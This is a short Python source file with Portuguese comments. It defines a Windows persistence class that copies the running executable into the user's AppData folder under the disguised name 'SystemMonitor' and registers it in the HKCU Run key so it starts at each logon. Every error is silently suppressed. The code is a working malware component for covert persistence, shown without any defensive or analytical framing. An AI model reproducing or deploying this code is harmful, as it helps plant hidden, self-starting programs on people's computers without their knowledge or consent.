import os
import shutil
import sys
import winreg

class PERSISTENCE:

    def __init__(self):
        self.app_name = "SystemMonitor"  # Nome disfarçado do executável
        self.target_dir = os.getenv('APPDATA')
        self.target_path = os.path.join(self.target_dir, f"{self.app_name}.exe")

        if not os.path.exists(self.target_path):
            self.copy_to_appdata()
            self.add_to_registry()

    def copy_to_appdata(self):
        try:
            current_path = sys.executable  # Caminho do executável atual
            shutil.copy2(current_path, self.target_path)
        except Exception as e:
            pass  # Silencia qualquer erro (evita crash)

    def add_to_registry(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, self.app_name, 0, winreg.REG_SZ, self.target_path)
            winreg.CloseKey(key)
        except Exception as e:
            pass  # Silencia qualquer erro
